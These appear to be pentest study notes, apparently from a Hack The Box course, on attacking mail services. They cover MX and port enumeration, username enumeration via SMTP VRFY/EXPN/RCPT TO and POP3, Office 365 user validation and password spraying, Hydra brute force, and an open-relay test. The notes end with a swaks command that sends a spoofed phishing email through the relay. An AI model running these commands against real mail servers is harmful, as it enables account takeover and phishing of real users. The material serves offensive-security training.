
# Enumeration

```
host -t MX hackthebox.eu
```

```
host -t MX microsoft.com
```

```
dig mx plaintext.do | grep "MX" | grep -v ";"
```

```
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

```
host -t A mail1.inlanefreight.htb.
```

| Port    | Service                 |
| ------- | ----------------------- |
| TCP/25  | SMTP Unencrypted        |
| TCP/143 | IMAP4 Unencrypted       |
| TCP/110 | POP3 Unencrypted        |
| TCP/465 | SMTP Encrypted          |
| TCP/587 | SMTP Encrypted/STARTTLS |
| TCP/993 | IMAP4 Encrypted         |
| TCP/995 | POP3 Encrypted          |

```
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

# Misconfigurations

## Authentication

The SMTP server has different commands that can be used to enumerate valid usernames VRFY, EXPN, and RCPT TO. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

VRFY this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

### SMTP
#### VRFY

```
telnet 10.10.110.20 25

RFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table

```

#### EXPN

```
telnet 10.10.110.20 25

EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

#### RCPT TO

```
telnet 10.10.110.20 25

MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

### POP3

#### USER

```
telnet 10.10.110.20 110

USER julio

-ERR


USER john

+OK
```

### SMTP-User-Enum

[smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)

```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

# Cloud Enumeration

## Office 365 O365

[O365spray](https://github.com/0xZDH/o365spray)

Validate it's using o365
```
python3 o365spray.py --validate --domain msplaintext.xyz
```

Spray usernames
```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

# Password Attacks

## Hydra

```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

## Cloud Services

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

### O365 Spray

```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

# Protocol Specifics Attacks

## SMTP Open Relay

An open relay is a Simple Mail Transfer Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay.

Identify if it's an open relay server
```
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

...

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Connect to server and send email
```
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

